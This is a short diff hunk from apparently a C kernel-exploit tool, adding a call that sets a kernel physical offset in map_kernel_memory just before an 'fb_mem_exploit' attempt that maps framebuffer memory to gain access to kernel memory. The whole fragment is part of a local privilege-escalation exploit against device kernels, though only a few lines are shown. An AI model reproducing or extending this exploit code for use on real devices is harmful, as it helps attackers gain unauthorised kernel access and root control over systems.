@@ -105,6 +105,8 @@ map_kernel_memory(void)
     }
   }
 
+  fb_mem_set_kernel_phys_offset(kernel_physical_offset - 0x8000);
+
   printf("Attempt fb_mem_exploit...\n");
   fb_mem_mmap_base = fb_mem_mmap(&fb_mmap_fd);
   if (fb_mem_mmap_base) {
